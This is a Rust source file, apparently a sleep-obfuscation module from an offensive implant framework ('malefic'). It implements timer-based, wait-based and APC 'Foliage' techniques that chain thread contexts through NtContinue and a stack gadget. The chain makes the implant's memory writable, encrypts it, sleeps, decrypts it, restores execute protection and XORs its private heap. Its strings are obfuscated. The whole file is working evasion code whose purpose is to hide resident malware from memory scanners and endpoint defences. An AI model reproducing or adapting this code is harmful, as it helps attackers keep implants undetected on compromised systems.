#![allow(
    non_snake_case,
    non_camel_case_types,
    non_upper_case_globals,
    clippy::missing_transmute_annotations
)]

use core::ffi::c_void;
use core::mem::zeroed;
use core::ptr::null_mut;

use anyhow::{bail, Result};
use malefic_gateway::obfstr::obfstr as s;

use crate::sleep::config::{init_config, Config};
use crate::sleep::types::*;
use crate::sleep::winapis::*;

// ── Public types ─────────────────────────────────────────────────────

/// Enumeration of supported memory obfuscation strategies.
pub enum Obfuscation {
    /// Thread pool timer-based (`TpSetTimer`).
    Timer,
    /// Thread pool wait-based (`TpSetWait`).
    Wait,
    /// APC-based (`NtQueueApcThread`).
    Foliage,
}

/// Bit-flags for obfuscation modes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(transparent)]
pub struct ObfMode(pub u32);

impl ObfMode {
    pub const None: Self = ObfMode(0b0000);
    pub const Heap: Self = ObfMode(0b0001);
    pub const Rwx: Self = ObfMode(0b0010);

    pub fn contains(self, other: ObfMode) -> bool {
        (self.0 & other.0) == other.0
    }
}

impl core::ops::BitOr for ObfMode {
    type Output = Self;
    fn bitor(self, rhs: Self) -> Self::Output {
        ObfMode(self.0 | rhs.0)
    }
}

// ── Macros ───────────────────────────────────────────────────────────

#[macro_export]
macro_rules! timer {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::sleep::hypnus::__private::hypnus_entry(
            $base,
            $size,
            $time,
            $crate::sleep::hypnus::Obfuscation::Timer,
            $crate::sleep::hypnus::ObfMode::None,
        )
    };
    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::sleep::hypnus::__private::hypnus_entry(
            $base,
            $size,
            $time,
            $crate::sleep::hypnus::Obfuscation::Timer,
            $mode,
        )
    };
}

#[macro_export]
macro_rules! wait {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::sleep::hypnus::__private::hypnus_entry(
            $base,
            $size,
            $time,
            $crate::sleep::hypnus::Obfuscation::Wait,
            $crate::sleep::hypnus::ObfMode::None,
        )
    };
    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::sleep::hypnus::__private::hypnus_entry(
            $base,
            $size,
            $time,
            $crate::sleep::hypnus::Obfuscation::Wait,
            $mode,
        )
    };
}

#[macro_export]
macro_rules! foliage {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::sleep::hypnus::__private::hypnus_entry(
            $base,
            $size,
            $time,
            $crate::sleep::hypnus::Obfuscation::Foliage,
            $crate::sleep::hypnus::ObfMode::None,
        )
    };
    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::sleep::hypnus::__private::hypnus_entry(
            $base,
            $size,
            $time,
            $crate::sleep::hypnus::Obfuscation::Foliage,
            $mode,
        )
    };
}

// ── Hypnus core ──────────────────────────────────────────────────────

#[derive(Clone, Copy, Debug)]
struct Hypnus {
    base: u64,
    size: u64,
    time: u64,
    cfg: &'static Config,
    mode: ObfMode,
}

impl Hypnus {
    #[inline]
    fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
        Self::new_from_ms(base, size, time.saturating_mul(1000), mode)
    }

    /// Create from millisecond-precision delay.
    /// Internally `self.time` is stored in ms (matching the Windows timer API).
    #[inline]
    fn new_from_ms(base: u64, size: u64, time_ms: u64, mode: ObfMode) -> Result<Self> {
        if base == 0 || size == 0 || time_ms == 0 {
            bail!(s!("invalid arguments").to_string())
        }

        Ok(Self {
            base,
            size,
            time: time_ms,
            mode,
            cfg: init_config()?,
        })
    }

    /// Timer strategy: uses TpSetTimer to drive the 7-step CONTEXT chain.
    fn timer(&mut self) -> Result<()> {
        unsafe {
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Create 3 synchronization events
            let mut events = [null_mut(); 3];
            for event in &mut events {
                let status = NtCreateEvent(
                    event,
                    EVENT_ALL_ACCESS,
                    null_mut(),
                    EVENT_TYPE::NotificationEvent,
                    0,
                );
                if !nt_success(status) {
                    bail!(s!("NtCreateEvent Failed").to_string());
                }
            }

            // Allocate thread pool with one worker
            let mut pool = null_mut();
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !nt_success(status) {
                bail!(s!("TpAllocPool Failed").to_string());
            }

            let mut stack = TP_POOL_STACK_INFORMATION {
                StackCommit: 0x80000,
                StackReserve: 0x80000,
            };
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !nt_success(status) {
                bail!(s!("TpSetPoolStackInformation Failed").to_string());
            }

            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            let mut env = TP_CALLBACK_ENVIRON_V3 {
                Pool: pool,
                ..Default::default()
            };

            // Capture the current thread context via trampoline
            let mut timer_ctx = null_mut();
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            status = TpAllocTimer(
                &mut timer_ctx,
                self.cfg.trampoline as *mut c_void,
                &mut ctx_init as *mut _ as *mut c_void,
                &mut env,
            );
            if !nt_success(status) {
                bail!(s!("TpAllocTimer [RtlCaptureContext] Failed").to_string());
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart = -(100i64 * 10_000);
            TpSetTimer(timer_ctx, &mut delay, 0, 0);

            // Signal after RtlCaptureContext finishes
            let mut timer_event = null_mut();
            status = TpAllocTimer(
                &mut timer_event,
                NtSetEvent2 as *mut c_void,
                events[0],
                &mut env,
            );
            if !nt_success(status) {
                bail!(s!("TpAllocTimer [NtSetEvent] Failed").to_string());
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetTimer(timer_event, &mut delay, 0, 0);

            // Wait for context capture
            status = NtWaitForSingleObject(events[0], 0, null_mut());
            if !nt_success(status) {
                bail!(s!("NtWaitForSingleObject Failed").to_string());
            }

            // Build 7-step CONTEXT chain
            let mut ctxs = [ctx_init; 7];
            for ctx in &mut ctxs {
                ctx.Rax = self.cfg.nt_continue.as_u64();
                // Rbp must point at [ctx_init.Rsp - 8] where the threadpool
                // dispatch return address lives (pushed by the threadpool's `call`).
                // RtlCaptureContext stores Rsp+8 (accounting for ret addr), so
                // ctx.Rsp - 8 = the position of the threadpool's return address.
                ctx.Rbp = ctx.Rsp - 8;
                // Move Rsp down to avoid conflicts with the worker thread's stack
                ctx.Rsp = (ctx.Rsp - 0x1000 * 5) & !0xF; // align to 16 bytes
                                                         // Write gadget_rbp (mov rsp, rbp; ret) as return address at [Rsp]
                (ctx.Rsp as *mut u64).write(self.cfg.gadget_rbp);
            }

            // Duplicate thread handle
            let mut h_thread = null_mut();
            status = NtDuplicateObject(
                nt_current_process(),
                nt_current_thread(),
                nt_current_process(),
                &mut h_thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );
            if !nt_success(status) {
                bail!(s!("NtDuplicateObject Failed").to_string());
            }

            // Step 0: Wait for signal
            ctxs[0].Rip = self.cfg.nt_wait_for_single.into();
            ctxs[0].Rcx = events[1] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8 = 0;

            // Step 1: VirtualProtect → RW
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[1].Rcx = nt_current_process() as u64;
            ctxs[1].Rdx = (&mut base as *mut u64) as u64;
            ctxs[1].R8 = (&mut size as *mut u64) as u64;
            ctxs[1].R9 = PAGE_READWRITE as u64;

            // Step 2: Encrypt (SystemFunction040 takes value params, not pointers)
            ctxs[2].Rip = self.cfg.system_function040.into();
            ctxs[2].Rcx = self.base;
            ctxs[2].Rdx = self.size;
            ctxs[2].R8 = 0;

            // Step 3: Sleep (WaitForSingleObject with timeout)
            ctxs[3].Rip = self.cfg.wait_for_single.into();
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = self.time;
            ctxs[3].R8 = 0;

            // Step 4: Decrypt (SystemFunction041 takes value params, not pointers)
            ctxs[4].Rip = self.cfg.system_function041.into();
            ctxs[4].Rcx = self.base;
            ctxs[4].Rdx = self.size;
            ctxs[4].R8 = 0;

            // Step 5: VirtualProtect → restore
            ctxs[5].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[5].Rcx = nt_current_process() as u64;
            ctxs[5].Rdx = base.as_u64();
            ctxs[5].R8 = size.as_u64();
            ctxs[5].R9 = protection;

            // Step 6: Signal completion
            ctxs[6].Rip = self.cfg.nt_set_event.into();
            ctxs[6].Rcx = events[2] as u64;
            ctxs[6].Rdx = 0;

            // Patch old_protect into the 5th argument slot (Rsp+0x28) for NtProtectVirtualMemory
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[5].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Schedule each CONTEXT via TpSetTimer
            for ctx in &mut ctxs {
                let mut timer = null_mut();
                status = TpAllocTimer(
                    &mut timer,
                    self.cfg.callback as *mut c_void,
                    ctx as *mut _ as *mut c_void,
                    &mut env,
                );
                if !nt_success(status) {
                    bail!(s!("TpAllocTimer Failed").to_string());
                }
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetTimer(timer, &mut delay, 0, 0);
            }

            // Optional heap encryption
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait for chain completion
            status = NtSignalAndWaitForSingleObject(events[1], events[2], 0, null_mut());
            if !nt_success(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed").to_string());
            }

            // Undo heap encryption
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup
            NtClose(h_thread);
            CloseThreadpool(pool);
            for h in &events {
                NtClose(*h);
            }

            Ok(())
        }
    }

    /// Wait strategy: uses TpSetWait to drive the 7-step CONTEXT chain.
    fn wait(&mut self) -> Result<()> {
        unsafe {
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Create 4 synchronization events
            let mut events = [null_mut(); 4];
            for event in &mut events {
                let status = NtCreateEvent(
                    event,
                    EVENT_ALL_ACCESS,
                    null_mut(),
                    EVENT_TYPE::NotificationEvent,
                    0,
                );
                if !nt_success(status) {
                    bail!(s!("NtCreateEvent Failed").to_string());
                }
            }

            // Allocate thread pool
            let mut pool = null_mut();
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !nt_success(status) {
                bail!(s!("TpAllocPool Failed").to_string());
            }

            let mut stack = TP_POOL_STACK_INFORMATION {
                StackCommit: 0x80000,
                StackReserve: 0x80000,
            };
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !nt_success(status) {
                bail!(s!("TpSetPoolStackInformation Failed").to_string());
            }

            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            let mut env = TP_CALLBACK_ENVIRON_V3 {
                Pool: pool,
                ..Default::default()
            };

            // Capture context via trampoline
            let mut wait_ctx = null_mut();
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            status = TpAllocWait(
                &mut wait_ctx,
                self.cfg.trampoline as *mut c_void,
                &mut ctx_init as *mut _ as *mut c_void,
                &mut env,
            );
            if !nt_success(status) {
                bail!(s!("TpAllocWait [RtlCaptureContext] Failed").to_string());
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart = -(100i64 * 10_000);
            TpSetWait(wait_ctx, events[0], &mut delay);

            // Signal after context capture
            let mut wait_event = null_mut();
            status = TpAllocWait(
                &mut wait_event,
                NtSetEvent2 as *mut c_void,
                events[1],
                &mut env,
            );
            if !nt_success(status) {
                bail!(s!("TpAllocWait [NtSetEvent] Failed").to_string());
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetWait(wait_event, events[0], &mut delay);

            // Wait for context capture
            status = NtWaitForSingleObject(events[1], 0, null_mut());
            if !nt_success(status) {
                bail!(s!("NtWaitForSingleObject Failed").to_string());
            }

            // Build 7-step CONTEXT chain
            let mut ctxs = [ctx_init; 7];
            for ctx in &mut ctxs {
                ctx.Rax = self.cfg.nt_continue.as_u64();
                // Rbp must point at [ctx_init.Rsp - 8] where the threadpool
                // dispatch return address lives
                ctx.Rbp = ctx.Rsp - 8;
                // Move Rsp down to avoid conflicts with the worker thread's stack
                ctx.Rsp = (ctx.Rsp - 0x1000 * 5) & !0xF; // align to 16 bytes
                                                         // Write gadget_rbp (mov rsp, rbp; ret) as return address at [Rsp]
                (ctx.Rsp as *mut u64).write(self.cfg.gadget_rbp);
            }

            // Duplicate thread handle
            let mut h_thread = null_mut();
            status = NtDuplicateObject(
                nt_current_process(),
                nt_current_thread(),
                nt_current_process(),
                &mut h_thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );
            if !nt_success(status) {
                bail!(s!("NtDuplicateObject Failed").to_string());
            }

            // Step 0: Wait for signal
            ctxs[0].Rip = self.cfg.nt_wait_for_single.into();
            ctxs[0].Rcx = events[2] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8 = 0;

            // Step 1: VirtualProtect → RW
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[1].Rcx = nt_current_process() as u64;
            ctxs[1].Rdx = (&mut base as *mut u64) as u64;
            ctxs[1].R8 = (&mut size as *mut u64) as u64;
            ctxs[1].R9 = PAGE_READWRITE as u64;

            // Step 2: Encrypt (SystemFunction040 takes value params, not pointers)
            ctxs[2].Rip = self.cfg.system_function040.into();
            ctxs[2].Rcx = self.base;
            ctxs[2].Rdx = self.size;
            ctxs[2].R8 = 0;

            // Step 3: Sleep
            ctxs[3].Rip = self.cfg.wait_for_single.into();
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = self.time;
            ctxs[3].R8 = 0;

            // Step 4: Decrypt (SystemFunction041 takes value params, not pointers)
            ctxs[4].Rip = self.cfg.system_function041.into();
            ctxs[4].Rcx = self.base;
            ctxs[4].Rdx = self.size;
            ctxs[4].R8 = 0;

            // Step 5: VirtualProtect → restore
            ctxs[5].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[5].Rcx = nt_current_process() as u64;
            ctxs[5].Rdx = base.as_u64();
            ctxs[5].R8 = size.as_u64();
            ctxs[5].R9 = protection;

            // Step 6: Signal completion
            ctxs[6].Rip = self.cfg.nt_set_event.into();
            ctxs[6].Rcx = events[3] as u64;
            ctxs[6].Rdx = 0;

            // Patch old_protect
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[5].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Schedule each CONTEXT via TpAllocWait
            for ctx in &mut ctxs {
                let mut w = null_mut();
                status = TpAllocWait(
                    &mut w,
                    self.cfg.callback as *mut c_void,
                    ctx as *mut _ as *mut c_void,
                    &mut env,
                );
                if !nt_success(status) {
                    bail!(s!("TpAllocWait Failed").to_string());
                }
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetWait(w, events[0], &mut delay);
            }

            // Optional heap encryption
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait for chain completion
            status = NtSignalAndWaitForSingleObject(events[2], events[3], 0, null_mut());
            if !nt_success(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed").to_string());
            }

            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup
            NtClose(h_thread);
            CloseThreadpool(pool);
            for h in &events {
                NtClose(*h);
            }

            Ok(())
        }
    }

    /// Foliage (APC) strategy: uses NtQueueApcThread to drive the 7-step CONTEXT chain.
    fn foliage(&mut self) -> Result<()> {
        unsafe {
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Create synchronization event
            let mut event = null_mut();
            let mut status = NtCreateEvent(
                &mut event,
                EVENT_ALL_ACCESS,
                null_mut(),
                EVENT_TYPE::SynchronizationEvent,
                0,
            );
            if !nt_success(status) {
                bail!(s!("NtCreateEvent Failed").to_string());
            }

            // Create suspended thread for APC injection
            let mut h_thread = null_mut();
            status = NtCreateThreadEx(
                &mut h_thread,
                THREAD_ALL_ACCESS,
                null_mut(),
                nt_current_process(),
                self.cfg.rtl_exit_user_thread.as_mut_ptr(),
                null_mut(),
                1, // CREATE_SUSPENDED
                0,
                0x1000 * 20,
                0x1000 * 20,
                null_mut(),
            );
            if !nt_success(status) {
                bail!(s!("NtCreateThreadEx Failed").to_string());
            }

            // Get initial context of suspended thread via NtGetContextThread
            let nt_get_context_thread: unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> NTSTATUS =
                core::mem::transmute(m_get_proc_address(
                    m_load_library_a(s!("ntdll.dll\0").as_ptr()),
                    s!("NtGetContextThread\0").as_ptr(),
                ));

            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                ..Default::default()
            };
            status = nt_get_context_thread(h_thread, &mut ctx_init);
            if !nt_success(status) {
                bail!(s!("NtGetContextThread Failed").to_string());
            }

            // Build 7-step CONTEXT chain
            let mut ctxs = [ctx_init; 7];

            // Duplicate the current thread handle for WaitForSingleObject
            let mut thread = null_mut();
            status = NtDuplicateObject(
                nt_current_process(),
                nt_current_thread(),
                nt_current_process(),
                &mut thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );
            if !nt_success(status) {
                bail!(s!("NtDuplicateObject Failed").to_string());
            }

            // For foliage (APC), write NtTestAlert at [Rsp] so after each step
            // returns, it triggers the next queued APC
            for ctx in ctxs.iter_mut() {
                // Write NtTestAlert as return address for APC chaining
                (ctx.Rsp as *mut u64).write(self.cfg.nt_test_alert.into());
            }

            // Step 0: Wait for signal
            ctxs[0].Rip = self.cfg.nt_wait_for_single.into();
            ctxs[0].Rcx = event as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8 = 0;

            // Step 1: VirtualProtect → RW
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[1].Rcx = nt_current_process() as u64;
            ctxs[1].Rdx = (&mut base as *mut u64) as u64;
            ctxs[1].R8 = (&mut size as *mut u64) as u64;
            ctxs[1].R9 = PAGE_READWRITE as u64;

            // Step 2: Encrypt (SystemFunction040 takes value params, not pointers)
            ctxs[2].Rip = self.cfg.system_function040.into();
            ctxs[2].Rcx = self.base;
            ctxs[2].Rdx = self.size;
            ctxs[2].R8 = 0;

            // Step 3: Sleep
            ctxs[3].Rip = self.cfg.wait_for_single.into();
            ctxs[3].Rcx = thread as u64;
            ctxs[3].Rdx = self.time;
            ctxs[3].R8 = 0;

            // Step 4: Decrypt (SystemFunction041 takes value params, not pointers)
            ctxs[4].Rip = self.cfg.system_function041.into();
            ctxs[4].Rcx = self.base;
            ctxs[4].Rdx = self.size;
            ctxs[4].R8 = 0;

            // Step 5: VirtualProtect → restore
            ctxs[5].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[5].Rcx = nt_current_process() as u64;
            ctxs[5].Rdx = base.as_u64();
            ctxs[5].R8 = size.as_u64();
            ctxs[5].R9 = protection;

            // Step 6: Exit the helper thread
            ctxs[6].Rip = self.cfg.rtl_exit_user_thread.into();
            ctxs[6].Rcx = 0;
            ctxs[6].Rdx = 0;

            // Patch old_protect
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[5].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Queue each CONTEXT as an APC
            for ctx in &mut ctxs {
                status = NtQueueApcThread(
                    h_thread,
                    self.cfg.nt_continue.as_ptr() as *mut c_void,
                    ctx as *mut _ as *mut c_void,
                    null_mut(),
                    null_mut(),
                );
                if !nt_success(status) {
                    bail!(s!("NtQueueApcThread Failed").to_string());
                }
            }

            // Resume the thread to trigger APC chain
            status = NtAlertResumeThread(h_thread, null_mut());
            if !nt_success(status) {
                bail!(s!("NtAlertResumeThread Failed").to_string());
            }

            // Optional heap encryption
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait until the helper thread finishes
            status = NtSignalAndWaitForSingleObject(event, h_thread, 0, null_mut());
            if !nt_success(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed").to_string());
            }

            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup
            NtClose(event);
            NtClose(h_thread);
            NtClose(thread);

            Ok(())
        }
    }
}

// ── Public entry point ───────────────────────────────────────────────

#[doc(hidden)]
pub mod __private {
    use super::*;

    /// Entry point: creates a fiber, runs the selected obfuscation strategy inside it.
    /// `time` is in **seconds**.
    pub fn hypnus_entry(base: *mut c_void, size: u64, time: u64, obf: Obfuscation, mode: ObfMode) {
        hypnus_entry_ms(base, size, time.saturating_mul(1000), obf, mode)
    }

    /// Like [`hypnus_entry`] but `time_ms` is in **milliseconds**.
    pub fn hypnus_entry_ms(
        base: *mut c_void,
        size: u64,
        time_ms: u64,
        obf: Obfuscation,
        mode: ObfMode,
    ) {
        let master = ConvertThreadToFiber(null_mut());
        if master.is_null() {
            return;
        }

        match Hypnus::new_from_ms(base as u64, size, time_ms, mode) {
            Ok(hypnus) => {
                let fiber_ctx = Box::new(FiberContext {
                    hypnus: Box::new(hypnus),
                    obf,
                    master,
                });

                let fiber = CreateFiber(
                    0x100000,
                    Some(hypnus_fiber),
                    Box::into_raw(fiber_ctx).cast(),
                );

                if fiber.is_null() {
                    ConvertFiberToThread();
                    return;
                }

                SwitchToFiber(fiber);
                DeleteFiber(fiber);
                ConvertFiberToThread();
            }
            Err(_error) => {
                #[cfg(debug_assertions)]
                eprintln!("[Hypnus::new] {:?}", _error);
                ConvertFiberToThread();
            }
        }
    }

    struct FiberContext {
        hypnus: Box<Hypnus>,
        obf: Obfuscation,
        master: *mut c_void,
    }

    extern "system" fn hypnus_fiber(ctx: *mut c_void) {
        unsafe {
            let mut ctx = Box::from_raw(ctx as *mut FiberContext);
            let _result = match ctx.obf {
                Obfuscation::Timer => ctx.hypnus.timer(),
                Obfuscation::Wait => ctx.hypnus.wait(),
                Obfuscation::Foliage => ctx.hypnus.foliage(),
            };

            #[cfg(debug_assertions)]
            if let Err(_error) = _result {
                eprintln!("[Hypnus] {:?}", _error);
            }

            SwitchToFiber(ctx.master);
        }
    }
}

// ── Helpers ──────────────────────────────────────────────────────────

use crate::kit::apis::{m_get_proc_address, m_load_library_a};

/// Walks the HypnusHeap private heap and XOR-encrypts/decrypts allocated entries.
fn obfuscate_heap(key: &[u8; 8]) {
    let heap = crate::sleep::allocator::HypnusHeap::get();
    if heap.is_null() {
        return;
    }

    let mut entry = unsafe { zeroed::<RTL_HEAP_WALK_ENTRY>() };
    loop {
        let status = RtlWalkHeap(heap, &mut entry);
        if status != 0 {
            break; // RtlWalkHeap returns 0 on success (found entry), non-zero when done
        }
        // Flag 0x01 = RTL_HEAP_BUSY (allocated block)
        if entry.Flags & 1 != 0 {
            xor(entry.DataAddress as *mut u8, entry.DataSize, key);
        }
    }
}

/// XOR a memory region with a repeating 8-byte key.
fn xor(data: *mut u8, len: usize, key: &[u8; 8]) {
    if data.is_null() {
        return;
    }
    for i in 0..len {
        unsafe {
            *data.add(i) ^= key[i % key.len()];
        }
    }
}

trait Asu64 {
    fn as_u64(&mut self) -> u64;
}

impl<T> Asu64 for T {
    fn as_u64(&mut self) -> u64 {
        self as *mut _ as *mut c_void as u64
    }
}
